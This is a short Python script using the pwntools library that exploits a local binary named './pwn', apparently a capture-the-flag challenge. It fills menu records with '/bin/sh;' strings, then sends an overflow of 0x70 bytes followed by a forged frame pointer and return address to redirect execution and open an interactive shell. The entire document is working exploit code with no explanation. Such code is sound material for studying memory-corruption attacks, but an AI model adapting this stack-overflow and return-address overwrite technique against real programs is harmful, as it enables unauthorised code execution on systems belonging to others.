from pwn import *
context(arch='amd64', os='linux', log_level='debug')
s=process("./pwn")
elf=ELF("./pwn")

def menu(ch):
    s.sendlineafter("chocie:",str(ch))
def trace(content):
    menu(1)
    s.sendafter(b"here:",content)
    s.sendlineafter(b"records?",b"n")

try_return=0x401bc7
pause()
for i in range(8):
    trace(b"/bin/sh;")
trace(b"A"*0x10)
trace(b"/bin/sh;") 

menu(2)
s.sendafter(b"plz: ",b"a"*0x70+p64(0x404040)+p64(try_return))

s.interactive()